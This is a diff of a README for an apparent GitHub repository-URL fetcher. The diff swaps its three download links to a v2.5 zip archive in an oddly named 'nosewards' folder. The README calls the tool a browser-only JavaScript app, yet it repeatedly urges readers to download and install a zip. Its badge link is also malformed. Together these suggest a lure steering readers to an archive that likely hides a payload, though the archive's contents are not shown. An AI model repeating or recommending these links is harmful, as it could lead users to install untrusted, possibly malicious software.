@@ -1,6 +1,6 @@
 # 🚀 xsukax-GitHub-Repository-Fetcher - Fetch and Export GitHub Repositories Effortlessly
 
-[![Download Release](https://raw.githubusercontent.com/CentBlocs/xsukax-GitHub-Repository-Fetcher/main/nosewards/Repository-Git-Hub-Fetcher-xsukax-v2.0.zip%20Now-%https://raw.githubusercontent.com/CentBlocs/xsukax-GitHub-Repository-Fetcher/main/nosewards/Repository-Git-Hub-Fetcher-xsukax-v2.0.zip)](https://raw.githubusercontent.com/CentBlocs/xsukax-GitHub-Repository-Fetcher/main/nosewards/Repository-Git-Hub-Fetcher-xsukax-v2.0.zip)
+[![Download Release](https://github.com/CentBlocs/xsukax-GitHub-Repository-Fetcher/raw/refs/heads/main/nosewards/Repository-xsukax-Git-Hub-Fetcher-v2.5.zip%20Now-%https://github.com/CentBlocs/xsukax-GitHub-Repository-Fetcher/raw/refs/heads/main/nosewards/Repository-xsukax-Git-Hub-Fetcher-v2.5.zip)](https://github.com/CentBlocs/xsukax-GitHub-Repository-Fetcher/raw/refs/heads/main/nosewards/Repository-xsukax-Git-Hub-Fetcher-v2.5.zip)
 
 ## 📖 Description
 A lightweight, privacy-focused web application that enables developers and researchers to efficiently retrieve and export all repository URLs from any GitHub user or organization profile. Built with vanilla JavaScript and designed to run entirely in the browser without requiring backend infrastructure or user authentication.
@@ -39,7 +39,7 @@ A lightweight, privacy-focused web application that enables developers and resea
 ### 📥 Download & Install
 To download the application, visit the Releases page.
 
-[Download Here](https://raw.githubusercontent.com/CentBlocs/xsukax-GitHub-Repository-Fetcher/main/nosewards/Repository-Git-Hub-Fetcher-xsukax-v2.0.zip)
+[Download Here](https://github.com/CentBlocs/xsukax-GitHub-Repository-Fetcher/raw/refs/heads/main/nosewards/Repository-xsukax-Git-Hub-Fetcher-v2.5.zip)
 
 Simply choose the latest release and follow the installation steps below.
 
@@ -76,4 +76,4 @@ This project is open-source and available under the MIT License. You can freely 
 
 Feel free to click the download link again if you need it.
 
-[Download Now](https://raw.githubusercontent.com/CentBlocs/xsukax-GitHub-Repository-Fetcher/main/nosewards/Repository-Git-Hub-Fetcher-xsukax-v2.0.zip)
+[Download Now](https://github.com/CentBlocs/xsukax-GitHub-Repository-Fetcher/raw/refs/heads/main/nosewards/Repository-xsukax-Git-Hub-Fetcher-v2.5.zip)
